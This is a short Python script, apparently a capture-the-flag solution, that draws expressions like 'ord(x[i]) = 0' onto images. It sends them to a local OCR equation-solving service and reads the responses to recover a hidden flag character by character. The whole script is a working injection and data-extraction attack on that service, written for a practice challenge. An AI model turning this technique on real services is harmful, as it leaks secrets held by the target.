import requests
from PIL import Image, ImageDraw, ImageFont
import os


def stringToImg(string, fileName):
    img = Image.new('RGB', (253, 53), color='#FFFFFF')
    d = ImageDraw.Draw(img)
    font = ImageFont.truetype("Roboto-Regular.ttf", 30)
    d.text((10, 10), string, fill=(0, 0, 0), font=font)
    img.save(fileName, "PNG")
    print("Immagine "+string+" generata")


def sendImgRequest(fileName, postId, url):
    files = {postId: open(fileName, "rb")}
    r = requests.post(url, files=files)
    return r


def findIntoRHTML(requestHTML, stringToFind):
    p = requestHTML.text.find(stringToFind)
    t = requestHTML.text
    res = ""
    if p != -1:
        while t[p+len(stringToFind)] != ' ':
            res += t[p+len(stringToFind)]
            p += 1
    return res


def deleteFile(fileName):
    if os.path.exists(fileName):
        os.remove(fileName)


f = "eqOcr.png"
url = "http://localhost:5000/equation"
stringToImg("ord(x[0]) = 0", f)
search = "that "
print("Stringa di ricerca nel sito: "+search)
i = 1
res = ""
while sendImgRequest(f, "file", url).text.find(search) != -1:
    print("Richiesta N. "+str(i)+" inviata e accettata.")
    res += chr(int(findIntoRHTML(sendImgRequest(f, "file", url), search)))
    print("Flag trovata per il momento :"+res)
    stringToImg("ord(x["+str(i)+"]) = 0", f)
    i += 1
deleteFile(f)
print("File temporanei rimossi")
print("FLAG : "+res)
